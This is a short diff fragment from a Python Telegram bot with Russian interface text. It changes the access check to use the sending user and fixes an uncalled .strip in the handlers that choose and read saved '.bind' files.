-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
     files_list = []
     for (root, dirs, files) in os.walk('binds', topdown=True):
@@ -1297,10 +1301,10 @@ def choose_bind(message: types.Message):
 
 
 def bind_read(message: types.Message):
-    if is_access_denied(message.chat.id): return None
+    if is_access_denied(message.from_user): return None
     
-    if message.text.strip == "/start": return start(message)
-    elif message.text.strip == "Назад": return bind_menu(message)
+    if message.text.strip() == "/start": return start(message)
+    elif message.text.strip() == "Назад": return bind_menu(message)
 
     if os.path.isfile(f"binds\\{message.text.strip()}.bind") == False:
         bot.send_message(message.chat.id, '😮 *Данного бинда не существует!*', parse_mode='Markdown')
